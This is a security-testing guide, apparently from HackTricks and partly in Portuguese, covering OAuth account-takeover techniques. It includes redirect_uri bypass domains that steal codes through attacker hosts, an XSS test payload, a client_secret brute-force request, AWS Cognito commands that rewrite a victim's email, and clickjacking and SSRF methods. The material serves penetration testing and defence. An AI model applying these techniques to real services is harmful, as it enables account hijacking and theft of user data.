# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.

It's essential to grasp the following components within the OAuth 2.0 framework:

- **resource owner**: Você, como o **usuário/entidade**, autoriza o acesso ao seu recurso, como os posts da sua conta em uma rede social.
- **resource server**: O **servidor que gerencia requisições autenticadas** depois que a aplicação obteve um `access token` em nome do `resource owner`, por exemplo, **https://socialmedia.com**.
- **client application**: A **aplicação que busca autorização** do `resource owner`, como **https://example.com**.
- **authorization server**: O **servidor que emite `access tokens`** para a `client application` após a autenticação bem-sucedida do `resource owner` e a obtenção da autorização, por exemplo, **https://socialmedia.com**.
- **client_id**: Um identificador público e único para a aplicação.
- **client_secret:** Uma chave confidencial, conhecida apenas pela aplicação e pelo authorization server, usada para gerar `access_tokens`.
- **response_type**: Um valor especificando **o tipo de token solicitado**, como `code`.
- **scope**: O **nível de acesso** que a `client application` está solicitando do `resource owner`.
- **redirect_uri**: A **URL para a qual o usuário é redirecionado após a autorização**. Tipicamente deve corresponder à URL de redirect pré-registrada.
- **state**: Um parâmetro para **manter dados durante o redirecionamento do usuário de ida e volta ao authorization server**. Sua unicidade é crítica para servir como um **mecanismo de proteção contra CSRF**.
- **grant_type**: Um parâmetro indicando **o tipo de grant e o tipo de token a ser retornado**.
- **code**: O authorization code do `authorization server`, usado em conjunto com `client_id` e `client_secret` pela `client application` para adquirir um `access_token`.
- **access_token**: O **token que a client application usa para requisições de API** em nome do `resource owner`.
- **refresh_token**: Permite que a aplicação **obtenha um novo `access_token` sem solicitar novamente ao usuário**.

### Flow

The **actual OAuth flow** proceeds as follows:

1. You navigate to [https://example.com](https://example.com) and select the “Integrate with Social Media” button.
2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com) asking for your authorization to let https://example.com’s application access your posts. The request is structured as:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Em seguida, é apresentada uma página de consentimento.
4. Após sua aprovação, Social Media envia uma resposta para o `redirect_uri` com os parâmetros `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utiliza este `code`, juntamente com seu `client_id` e `client_secret`, para fazer uma requisição do lado do servidor para obter um `access_token` em seu nome, permitindo o acesso às permissões às quais você consentiu:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, o processo conclui quando https://example.com emprega seu `access_token` para fazer uma chamada de API para Social Media para acessar

## Vulnerabilidades <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

De acordo com [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), o servidor de autorização deve redirecionar o navegador apenas para redirect URIs pré-registradas e exatas. Qualquer fraqueza aqui permite que um atacante envie uma vítima através de uma URL de autorização maliciosa de modo que o IdP entregue o `code` (e o `state`) da vítima diretamente para um endpoint do atacante, que então pode resgatá‑lo e obter tokens.

Fluxo de ataque típico:

1. Crie `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e envie para a vítima.
2. A vítima autentica-se e aprova os scopes.
3. O IdP redireciona para `attacker.tld/callback?code=<victim-code>&state=...` onde o atacante registra a requisição e imediatamente resgata o `code`.

Erros comuns de validação a serem testados:

- **No validation** – qualquer URL absoluta é aceita, resultando em roubo instantâneo do `code`.
- **Weak substring/regex checks on the host** – contorne com domínios parecidos como `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ou `match.com@evil.com`.
- **IDN homograph mismatches** – a validação acontece na forma punycode (`xn--`), mas o navegador redireciona para o domínio Unicode controlado pelo atacante.
- **Arbitrary paths on an allowed host** – apontar `redirect_uri` para `/openredirect?next=https://attacker.tld` ou qualquer endpoint de XSS/conteúdo do usuário leaks o `code` seja por redirecionamentos encadeados, cabeçalhos Referer, ou JavaScript injetado.
- **Directory constraints without normalization** – padrões como `/oauth/*` podem ser contornados com `/oauth/../anything`.
- **Wildcard subdomains** – aceitar `*.example.com` significa que qualquer takeover (dangling DNS, S3 bucket, etc.) imediatamente fornece um callback válido.
- **Non-HTTPS callbacks** – permitir URIs `http://` dá a atacantes na rede (Wi-Fi, corporate proxy) a oportunidade de interceptar o `code` em trânsito.

Revise também parâmetros auxiliares no estilo redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) e o documento de descoberta OpenID (`/.well-known/openid-configuration`) para endpoints adicionais que possam herdar as mesmas falhas de validação.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Como mencionado neste bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), pode ser possível que a redirect URL esteja sendo refletida na resposta do servidor após o usuário autenticar-se, estando vulnerável a XSS. Payload possível para testar:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Tratamento inadequado do parâmetro state <a href="#bda5" id="bda5"></a>

O `state` parameter é o CSRF token do Authorization Code flow: o cliente deve gerar um **valor criptograficamente aleatório por instância de browser**, persistir esse valor em local somente acessível por esse browser (cookie, local storage, etc.), enviá‑lo na requisição de autorização e rejeitar qualquer resposta que não retorne o mesmo valor. Sempre que o valor for estático, previsível, opcional ou não estiver atrelado à sessão do usuário, o atacante pode concluir seu próprio fluxo OAuth, capturar a requisição final `?code=` (sem enviá‑la) e depois coagir o browser da vítima a reproduzir essa requisição para que a conta da vítima fique vinculada ao perfil do provedor de identidade do atacante.

O padrão de replay é sempre o mesmo:

1. O atacante autentica contra o IdP com sua conta e intercepta o último redirect contendo `code` (e qualquer `state`).
2. Ele descarta essa requisição, guarda a URL e depois abusa de qualquer primitive de CSRF (link, iframe, formulário que auto‑submete) para forçar o browser da vítima a carregá‑la.
3. Se o cliente não validar `state`, a aplicação consome o resultado de autorização do atacante e loga o atacante na conta da vítima na aplicação.

Checklist prático para tratamento de `state` durante testes:

- **Missing `state` entirely** – se o parâmetro nunca aparece, todo o login é CSRFable.
- **`state` not required** – remova-o da requisição inicial; se o IdP ainda emitir codes que o cliente aceite, a defesa é opt‑in.
- **Returned `state` not validated** – modifique o valor na resposta (Burp, MITM proxy). Aceitar valores divergentes significa que o token armazenado nunca é comparado.
- **Predictable or purely data-driven `state`** – muitas apps colocam paths de redirect ou blobs JSON em `state` sem misturar entropia, permitindo que atacantes adivinhem valores válidos e reproduzam fluxos. Sempre prefixe/sufixe uma forte entropia antes de codificar dados.
- **`state` fixation** – se a app permite que usuários forneçam o valor de `state` (ex.: via URLs de autorização forjadas) e o reutiliza durante o fluxo, um atacante pode fixar um valor conhecido e reutilizá‑lo em várias vítimas.

PKCE pode complementar `state` (especialmente para public clients) vinculando o authorization code a um code verifier, mas web clients ainda devem rastrear `state` para evitar bugs de CSRF/ligação de conta entre usuários.

### Pré Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Atacantes podem criar antecipadamente uma conta usando o e‑mail da vítima. Se a vítima depois usar um serviço third‑party para login, a aplicação pode inadvertidamente vincular essa conta third‑party à conta pré‑criada pelo atacante, levando a acesso não autorizado.
2. **Exploiting Lax OAuth Email Verification**: Atacantes podem explorar serviços OAuth que não verificam e‑mails ao se registrarem e então alterar o e‑mail da conta para o da vítima. Esse método tem risco semelhante de acesso não autorizado, análogo ao primeiro cenário mas por um vetor diferente.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

O `client_id` é intencionalmente público, mas o **`client_secret` nunca deve ser recuperável por usuários finais**. Deployments de Authorization Code que embutem o secret em **mobile APKs, desktop clients, ou single‑page apps** efetivamente entregam essa credencial a qualquer um que possa baixar o pacote. Sempre inspecione public clients por:

- Desempacotar o APK/IPA, desktop installer ou app Electron e grepar por `client_secret`, blobs Base64 que decodifiquem para JSON, ou endpoints OAuth hard‑coded.
- Rever arquivos de configuração incluídos (plist, JSON, XML) ou strings decompiladas em busca de credenciais de client.

Uma vez que o atacante extrai o secret, ele só precisa roubar qualquer authorization `code` da vítima (via um `redirect_uri` fraco, logs, etc.) para, de forma independente, bater em `/token` e mintar access/refresh tokens sem envolver a app legítima. Trate public/native clients como **incapazes de armazenar secrets** — eles devem confiar em PKCE (RFC 7636) para provar posse de um code verifier por instância em vez de um secret estático. Durante o teste, confirme se PKCE é obrigatório e se o backend realmente rejeita trocas de token que omitem o `client_secret` **ou** um `code_verifier` válido.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.  
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token armazenado no histórico do navegador

A garantia central do Authorization Code grant é que **access tokens nunca reach the resource owner’s browser**. Quando implementações leak tokens no client-side, qualquer bug menor (XSS, Referer leak, proxy logging) se torna um comprometimento instantâneo de conta. Sempre verifique:

- **Tokens em URLs** – se `access_token` aparece na query/fragment, ele vai para o histórico do navegador, logs do servidor, analytics, e Referer headers enviados a terceiros.
- **Tokens transitando por middleboxes não confiáveis** – retornar tokens via HTTP ou através de debugging/corporate proxies permite que observadores de rede os capturem diretamente.
- **Tokens armazenados no estado JavaScript** – React/Vue stores, variáveis globais, ou blobs JSON serializados expõem tokens a todo script na origem (incluindo payloads XSS ou extensões maliciosas).
- **Tokens persistidos no Web Storage** – `localStorage`/`sessionStorage` retêm tokens muito depois do logout em dispositivos compartilhados e são acessíveis por scripts.

Qualquer um desses achados normalmente eleva bugs considerados “low” (como um CSP bypass ou DOM XSS) para takeover completo da API porque o atacante pode simplesmente ler e replay the leaked bearer token.

### Authorization Code permanente

Authorization codes devem ser de curta duração, de uso único e resistentes a replay. Ao avaliar um fluxo, capture um `code` e:

- **Teste o tempo de vida** – RFC 6749 recomenda minutos, não horas. Tente resgatar o `code` após 5–10 minutos; se ainda funcionar, a janela de exposição para qualquer leaked code é excessiva.
- **Teste de reutilização sequencial** – envie o mesmo `code` duas vezes. Se a segunda requisição gerar outro token, atacantes podem clonar sessões indefinidamente.
- **Teste de resgate concorrente/condições de race** – dispare duas requisições de token em paralelo (Burp intruder, turbo intruder). Issuers fracos às vezes concedem ambos.
- **Observe o tratamento de replay** – uma tentativa de reutilização não deve apenas falhar, mas também revogar quaisquer tokens já emitidos a partir daquele `code`. Caso contrário, um replay detectado deixa o primeiro token do atacante ativo.

Combinar um code permissivo a replay com qualquer `redirect_uri` ou bug de logging permite acesso persistente à conta mesmo depois que a vítima completa o login legítimo.

### Authorization/Refresh Token não vinculados ao client

Se você conseguir obter o **authorization code** e usá-lo com um client diferente, então você pode takeover outras contas.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Confira este post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Para informações mais detalhadas sobre como abusar do AWS Cognito, confira [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusar de tokens de outras aplicações <a href="#bda5" id="bda5"></a>

Como [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), fluxos OAuth que esperam receber o **token** (e não um code) podem ser vulneráveis se não verificarem que o token pertence à app.

Isto porque um **atacante** poderia criar uma **aplicação que suporte OAuth e login com Facebook** (por exemplo) em sua própria aplicação. Então, uma vez que uma vítima faça login com Facebook na **aplicação do atacante**, o atacante poderia obter o **OAuth token do usuário concedido à sua aplicação, e usá-lo para fazer login na aplicação OAuth da vítima usando o token do usuário da vítima**.

> [!CAUTION]
> Portanto, se o atacante conseguir fazer com que o usuário acesse sua própria aplicação OAuth, ele poderá tomar controle da conta da vítima em aplicações que esperam um token e não verificam se o token foi concedido ao seu app ID.

### Dois links & cookie <a href="#bda5" id="bda5"></a>

De acordo com [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possível fazer a vítima abrir uma página com um **returnUrl** apontando para o host do atacante. Essa informação seria **armazenada em um cookie (RU)** e, em um **passo posterior**, o **prompt** perguntaria ao **usuário** se ele quer conceder acesso àquele host do atacante.

Para contornar esse prompt, era possível abrir uma aba para iniciar o **Oauth flow** que definiria esse cookie RU usando o **returnUrl**, fechar a aba antes do prompt ser mostrado e abrir uma nova aba sem esse valor. Então, o **prompt não informará sobre o host do atacante**, mas o cookie teria sido definido para ele, de modo que o **token será enviado para o host do atacante** na redireção.

### Bypass de interação do prompt <a href="#bda5" id="bda5"></a>

Como explicado em [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), algumas implementações OAuth permitem indicar o parâmetro GET **`prompt`** como None (**`&prompt=none`**) para **evitar que os usuários sejam solicitados a confirmar** o acesso dado em um prompt na web se já estiverem logados na plataforma.

### response_mode

Como [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), pode ser possível indicar o parâmetro **`response_mode`** para especificar onde você quer que o code seja fornecido na URL final:

- `response_mode=query` -> O code é fornecido dentro de um parâmetro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> O code é fornecido dentro do fragmento da URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> O code é fornecido dentro de um formulário POST com um input chamado `code` e o valor
- `response_mode=web_message` -> O code é enviado em um post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking em diálogos de consentimento OAuth

Diálogos de consentimento/login OAuth são alvos ideais para clickjacking: se puderem ser emoldurados, um atacante pode sobrepor gráficos personalizados, esconder os botões reais e enganar usuários para aprovarem scopes perigosos ou vincularem contas. Construa PoCs que:

1. Carreguem a URL de autorização do IdP dentro de um <iframe sandbox="allow-forms allow-scripts allow-same-origin">.
2. Usem posicionamento absoluto/truques de opacidade para alinhar botões falsos com os controles **Allow**/**Approve** ocultos.
3. Opcionalmente preencham parâmetros (scopes, redirect URI) para que a aprovação roubada beneficie imediatamente o atacante.

Durante os testes verifique se as páginas do IdP emitem `X-Frame-Options: DENY/SAMEORIGIN` ou uma `Content-Security-Policy: frame-ancestors 'none'` restritiva. Se nenhuma estiver presente, demonstre o risco com ferramentas como [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registre o quão facilmente uma vítima autoriza o app do atacante. Para ideias adicionais de payload veja [Clickjacking](clickjacking.md).

### OAuth ROPC flow - bypass de 2 FA <a href="#b440" id="b440"></a>

De acordo com [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), este é um OAuth flow que permite logar no OAuth via **username** e **password**. Se, durante esse fluxo simples, um **token** com acesso a todas as ações que o usuário pode executar for retornado, então é possível contornar a 2FA usando esse token.

### ATO em página web que redireciona baseada em open redirect para o referrer <a href="#bda5" id="bda5"></a>

Esse [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) descreve como foi possível abusar de um **open redirect** usando o valor do **referrer** para explorar OAuth até ATO. O ataque foi:

1. A vítima acessa a página web do atacante.
2. A vítima abre o link malicioso e um opener inicia o Google OAuth flow com `response_type=id_token,code&prompt=none` como parâmetros adicionais, usando como **referrer o site do atacante**.
3. No opener, após o provedor autorizar a vítima, ele a envia de volta para o valor do parâmetro `redirect_uri` (site da vítima) com um código 30X que ainda mantém o site do atacante no referer.
4. O site da vítima **aciona o open redirect com base no referrer**, redirecionando o usuário para o site do atacante; como o **`respose_type`** era **`id_token,code`**, o code será enviado de volta ao atacante no **fragmento** da URL, permitindo que ele assuma a conta do usuário via Google no site da vítima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Para mais detalhes desta técnica.**

Dynamic Client Registration em OAuth funciona como um vetor menos óbvio mas crítico para vulnerabilidades de segurança, especificamente para ataques de **Server-Side Request Forgery (SSRF)**. Esse endpoint permite que servidores OAuth recebam detalhes sobre aplicações cliente, incluindo URLs sensíveis que podem ser exploradas.

Pontos-chave:

- **Dynamic Client Registration** é frequentemente mapeado para `/register` e aceita detalhes como `client_name`, `client_secret`, `redirect_uris`, e URLs para logos ou JSON Web Key Sets (JWKs) via requisições POST.
- Esse recurso segue especificações definidas em **RFC7591** e **OpenID Connect Registration 1.0**, que incluem parâmetros potencialmente vulneráveis a SSRF.
- O processo de registro pode inadvertidamente expor servidores a SSRF de várias maneiras:
- **`logo_uri`**: Uma URL para o logo da aplicação cliente que pode ser buscada pelo servidor, acionando SSRF ou levando a XSS se a URL for maltratada.
- **`jwks_uri`**: Uma URL para o documento JWK do cliente que, se maliciosamente construída, pode fazer o servidor realizar requisições outbound a um servidor controlado pelo atacante.
- **`sector_identifier_uri`**: Referencia um array JSON de `redirect_uris`, que o servidor pode buscar, criando uma oportunidade de SSRF.
- **`request_uris`**: Lista URIs de request permitidas para o cliente, que podem ser exploradas se o servidor buscar essas URIs no início do processo de autorização.

Estratégia de exploração:

- SSRF pode ser acionado registrando um novo cliente com URLs maliciosas em parâmetros como `logo_uri`, `jwks_uri` ou `sector_identifier_uri`.
- Enquanto a exploração direta via `request_uris` pode ser mitigada por controles de whitelist, fornecer um `request_uri` previamente registrado e controlado pelo atacante pode facilitar SSRF durante a fase de autorização.

## OAuth providers Race Conditions

Se a plataforma que você está testando for um OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

No OAuth, o campo sub identifica unicamente um usuário, mas seu formato varia por Authorization Server. Para padronizar a identificação do usuário, alguns clients usam emails ou handles de usuário. Contudo, isso é arriscado porque:

- Alguns Authorization Servers não garantem que essas propriedades (como email) permaneçam imutáveis.
- Em certas implementações — como **"Login with Microsoft"** — o client confia no campo email, que é **controlado pelo usuário no Entra ID** e não verificado.
- Um atacante pode explorar isso criando sua própria organização Azure AD (por exemplo, doyensectestorg) e usá-la para efetuar um login Microsoft.
- Embora o Object ID (armazenado em sub) seja imutável e seguro, a dependência de um campo email mutável pode permitir um account takeover (por exemplo, sequestrar uma conta como victim@gmail.com).

## Client Confusion Attack

Em um **Client Confusion Attack**, uma aplicação que usa o OAuth Implicit Flow não verifica se o access token final foi especificamente gerado para seu próprio Client ID. Um atacante monta um site público que usa o Google’s OAuth Implicit Flow, enganando milhares de usuários a fazerem login e assim colhendo access tokens destinados ao site do atacante. Se esses usuários também possuem contas em outro site vulnerável que não valida o Client ID do token, o atacante pode reutilizar os tokens coletados para se passar pelas vítimas e tomar suas contas.

## Scope Upgrade Attack

O tipo **Authorization Code Grant** envolve comunicação segura server-to-server para transmitir dados do usuário. Entretanto, se o **Authorization Server** confia implicitamente no parâmetro scope na Access Token Request (um parâmetro não definido no RFC), uma aplicação maliciosa poderia elevar os privilégios de um authorization code ao solicitar um scope mais alto. Após o **Access Token** ser gerado, o **Resource Server** deve verificá-lo: para tokens JWT, isso envolve checar a assinatura do JWT e extrair dados como client_id e scope, enquanto para tokens em forma de string aleatória, o servidor deve consultar o Authorization Server para recuperar os detalhes do token.

## Redirect Scheme Hijacking

Em implementações OAuth móveis, apps usam **custom URI schemes** para receber redirecionamentos com Authorization Codes. Porém, como múltiplos apps podem registrar o mesmo scheme em um dispositivo, a suposição de que apenas o client legítimo controla o redirect URI é violada. No Android, por exemplo, um Intent URI como `com.example.app://` oauth é capturado com base no scheme e filtros opcionais definidos no intent-filter de um app. Como a resolução de intents do Android pode ser ampla — especialmente se apenas o scheme for especificado — um atacante pode registrar um app malicioso com um intent-filter cuidadosamente construído para sequestrar o authorization code. Isso pode **permitir um account takeover** tanto via interação do usuário (quando múltiplos apps são elegíveis para tratar a intent) quanto via técnicas de bypass que exploram filtros excessivamente permissivos, conforme detalhado pelo fluxograma de avaliação da Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)

{{#include ../banners/hacktricks-training.md}}
